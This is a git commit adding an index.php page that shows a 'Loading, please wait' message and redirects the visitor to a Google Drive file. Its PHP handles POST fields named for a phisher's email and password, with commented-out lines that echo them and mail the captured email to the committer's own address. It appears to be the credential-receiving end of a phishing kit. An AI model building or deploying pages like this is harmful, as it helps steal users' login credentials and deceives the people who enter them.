7558c62f69cfb448fd5957b7444db97623487305
junboo <ex01.hex@gmail.com>
2019-07-12 02:38:02 +0900

    Add files via upload

---
+++ html/index.php
@@ -0,0 +1,9 @@
+<meta http-equiv="refresh" content="2;URL='https://drive.google.com/file/d/1ctMqXNQZK7UcgOa7OXyCW4R5cUXkaYqa/view?usp=sharing'"/>
+Loading, please wait ...
+<?php
+mb_language("Japanese");
+mb_internal_encoding("UTF-8");
+#echo $_POST["wfphshremail"];
+#echo $_POST["wfphshrpassword"];
+#mb_send_mail("ex01.hex@gmail.com","eml",$_POST["wfphshremail"]);
+?>
